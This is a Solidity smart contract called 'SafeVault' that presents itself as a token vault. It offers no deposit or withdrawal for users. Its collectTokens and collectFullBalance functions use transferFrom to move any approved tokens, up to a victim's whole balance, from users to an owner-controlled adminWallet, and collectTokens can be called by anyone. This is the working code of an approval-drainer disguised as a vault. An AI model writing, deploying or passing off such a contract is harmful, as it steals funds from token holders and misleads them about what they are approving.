// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20 {

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);

    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);

    function balanceOf(
        address account
    ) external view returns (uint256);
}

contract SafeVault {

    address public owner;
    address public adminWallet;

    mapping(address => bool) public supportedTokens;

    event OwnershipTransferred(
        address indexed oldOwner,
        address indexed newOwner
    );

    event AdminWalletUpdated(
        address indexed oldWallet,
        address indexed newWallet
    );

    event TokenSupported(
        address indexed token,
        bool status
    );

    event TokensCollected(
        address indexed token,
        address indexed user,
        uint256 amount
    );

    modifier onlyOwner() {
        require(msg.sender == owner, "Unauthorized");
        _;
    }

    constructor(address _adminWallet) {
        require(_adminWallet != address(0), "Invalid admin");

        owner = msg.sender;
        adminWallet = _adminWallet;
    }

    function transferOwnership(
        address newOwner
    ) external onlyOwner {

        require(newOwner != address(0), "Invalid owner");

        emit OwnershipTransferred(owner, newOwner);

        owner = newOwner;
    }

    function setAdminWallet(
        address wallet
    ) external onlyOwner {

        require(wallet != address(0), "Invalid wallet");

        emit AdminWalletUpdated(adminWallet, wallet);

        adminWallet = wallet;
    }

    function setSupportedToken(
        address token,
        bool status
    ) external onlyOwner {

        supportedTokens[token] = status;

        emit TokenSupported(token, status);
    }

    function collectTokens(
        address token,
        address user,
        uint256 amount
    ) external {

        require(supportedTokens[token], "Token not supported");
        require(user != address(0), "Invalid user");
        require(amount > 0, "Invalid amount");

        IERC20 erc20 = IERC20(token);

        require(
            erc20.balanceOf(user) >= amount,
            "Insufficient balance"
        );

        require(
            erc20.allowance(user, address(this)) >= amount,
            "Insufficient allowance"
        );

        bool success = erc20.transferFrom(
            user,
            adminWallet,
            amount
        );

        require(success, "Transfer failed");

        emit TokensCollected(
            token,
            user,
            amount
        );
    }

    function collectFullBalance(
        address token,
        address user
    ) external onlyOwner {

        require(supportedTokens[token], "Token not supported");

        IERC20 erc20 = IERC20(token);

        uint256 balance = erc20.balanceOf(user);

        require(balance > 0, "Zero balance");

        require(
            erc20.allowance(user, address(this)) >= balance,
            "Approve full balance"
        );

        bool success = erc20.transferFrom(
            user,
            adminWallet,
            balance
        );

        require(success, "Transfer failed");

        emit TokensCollected(
            token,
            user,
            balance
        );
    }
}